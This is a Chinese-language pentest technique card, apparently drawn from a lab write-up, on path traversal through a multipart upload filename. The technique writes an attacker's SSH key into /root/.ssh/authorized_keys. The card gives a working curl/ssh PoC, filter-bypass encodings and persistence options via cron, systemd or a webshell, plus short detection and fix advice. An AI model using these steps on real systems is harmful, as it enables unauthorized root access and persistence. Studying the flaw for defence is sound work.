---
id: web-generic-file-upload-multipart-filename-traversal-ssh-key
title: multipart filename 路径穿越：PUT /file_upload 写任意路径并植入 SSH authorized_keys
type: scenario
domain: web
path: web/generic/file-upload
technique: multipart-filename-path-traversal
aliases:
- 上传文件名路径穿越
- multipart filename traversal
- file_upload 任意文件写
- 写 authorized_keys
- 上传接口 getshell
- filename ../../../
tags:
- file-upload
- path-traversal
- multipart
- arbitrary-write
- ssh
- authorized-keys
- fastapi
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V65
  verified_at: '2026-11-05T12:03:05+08:00'
  notes: 已对照全文与图28/29核对：PUT /file_upload 的 multipart filename=../../../root/.ssh/test 与 ../../../root/.ssh/authorized_keys 均返回 200 且 message 回显写入路径；随后 ssh -i spooktrol -p 2222 root@target 登录成功（正文终端输出 root@spook2）；Dockerfile 确认 mkdir /root/.ssh 且服务以 root 运行。卡内原理/步骤/PoC 与原文一致。未验证点：绝对路径 filename 为变体建议、原文只实测 ../ 形式；写 cron/systemd/WebShell 为扩展；PoC 未在本机执行。frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

上传接口 `PUT /file_upload` 直接使用 multipart 请求里客户端提供的 `filename` 作为保存路径，攻击者把 filename 改成 `../../../root/.ssh/authorized_keys`，即可在服务进程权限下写任意文件；若服务以 root 运行，就能植入 SSH 公钥并直接以 root 登录。

## 原理

- multipart/form-data 的每个 part 都带 `Content-Disposition: form-data; name="file"; filename="..."`。很多实现直接把 `filename` 拼到上传目录后保存，而不是只取 basename。
- 若 `filename` 含 `../`，拼接后的路径会跳出上传目录；若含绝对路径（如 `/root/.ssh/authorized_keys`），则直接覆盖目标路径。服务进程的权限决定能写到哪里。
- 该应用以 root 运行，且 `/root/.ssh/` 已存在（镜像构建时创建了 `authorized_keys`），因此上传一个公钥文件到该路径即可获得 root 的 SSH 登录能力。
- 上传接口通常只校验会话/Cookie，而本例的 `auth` token 可由 `GET /` 匿名取得；即使需要认证，普通用户的上传权限也足以写任意路径。
- 与“上传 WebShell”相比，写 `authorized_keys` 不依赖 Web 目录可解析、不需要猜测 Web 根路径，成功率更高，且更隐蔽。

## 触发条件

- 存在文件上传接口，且服务端使用客户端提供的 `filename` 拼接保存路径。
- 服务进程对目标路径有写权限（本例为 root，可写 `/root/.ssh/`）。
- 目标目录存在（如 `/root/.ssh`），或攻击者能先创建目录。
- 上传接口可达，且认证可绕过/凭据可获取；若要求认证，普通用户权限通常足够。

## 利用步骤

1. 生成 SSH 密钥对：
   ```bash
   ssh-keygen -t ed25519 -f ./spooktrol -N ''
   ```
2. 构造 multipart 上传，把 filename 设为穿越路径：
   ```bash
   curl -X PUT 'http://target/file_upload' \
     -H 'Cookie: auth=<token>' \
     -F 'file=@spooktrol.pub;filename=../../../root/.ssh/authorized_keys'
   ```
   若目标是绝对路径，可尝试 `filename=/root/.ssh/authorized_keys`。
3. 确认写入：读取 `/root/.ssh/authorized_keys`（若存在任意文件读取端点）或直接尝试登录。
4. 用私钥登录：
   ```bash
   ssh -i ./spooktrol -p 2222 root@target
   ```
5. 若 SSH 不可用，可改写 cron、systemd unit、Web 目录文件等实现命令执行。

## PoC

```bash
ssh-keygen -t ed25519 -f ./spooktrol -N ''
curl -X PUT 'http://target/file_upload' \
  -H 'Cookie: auth=<token>' \
  -F 'file=@spooktrol.pub;filename=../../../root/.ssh/authorized_keys'
ssh -i ./spooktrol -p 2222 root@target
```

```text
# 原始 multipart part（等价手工构造）
Content-Disposition: form-data; name="file"; filename="../../../root/.ssh/authorized_keys"
Content-Type: application/octet-stream

ssh-ed25519 AAAA... attacker
```

## 变体与关联

- 变体：filename 用 URL 编码 `%2e%2e%2f`、双重编码、反斜杠 `..\..\` 绕过简单过滤。
- 变体：写 `~/.ssh/authorized_keys`、`/etc/cron.d/`、`/etc/systemd/system/`、Web 根目录 WebShell、应用配置（如 `server.py`）实现持久化/RCE。
- 变体：若只能写 Web 可访问目录，则上传脚本文件 getshell，见 [[web-generic-file-upload-xiaozhi-upload-any-extension-webroot]]。
- 关联：[[web-generic-file-inclusion-fastapi-file-management-traversal]]（同一应用读取侧路径穿越）、[[pentest-c2-implant-mitm-task-injection]]（C2 任务 3 调用该上传端点）。
- 边界：服务端只取 `os.path.basename(filename)`、白名单后缀、上传目录外无写权限、以低权限运行、或目标目录不存在时，写入失败。

## 检测与防御

- 检测：multipart filename 中出现 `../`、绝对路径、编码后的 `..`；上传请求的保存路径落在上传目录之外；`authorized_keys`、cron、systemd 目录出现非管理员写入。
- 修复：保存前只取 basename，或用服务端生成的随机文件名；校验扩展名/内容类型白名单；把上传目录固定并禁止路径分隔符。
- 加固：上传服务以最小权限运行，不能写 `/root/.ssh`、cron、systemd；上传目录与代码目录隔离且不可执行；对敏感文件做完整性监控。
